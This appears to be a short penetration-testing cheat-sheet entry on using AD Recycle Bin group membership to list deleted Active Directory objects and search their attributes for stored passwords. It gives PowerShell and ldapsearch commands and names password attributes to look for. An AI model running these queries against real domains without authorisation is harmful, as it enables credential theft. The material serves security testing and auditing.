# AD Recycle Bin — Recover Deleted Objects

Members of `AD Recycle Bin` group can read deleted AD objects — including passwords stored in attributes.

**List all deleted objects:**
```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -IncludeDeletedObjects
```

**Get all properties of a specific deleted object:**
```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' \
  -IncludeDeletedObjects -Properties *
```
Look for `cascadeLegacyPwd`, `userPassword`, `unixUserPassword`, description fields — legacy/temp accounts often have plaintext passwords.

**Via LDAP (from Linux):**
```bash
ldapsearch -H ldap://<DC> -D '<user>@<domain>' -w '<pass>' \
  -b "CN=Deleted Objects,DC=<dom>,DC=<tld>" \
  -s sub "(isDeleted=TRUE)" \
  "(showInAdvancedViewOnly=TRUE)" \
  -E '!1.2.840.113556.1.4.417' \
  '*' +
```
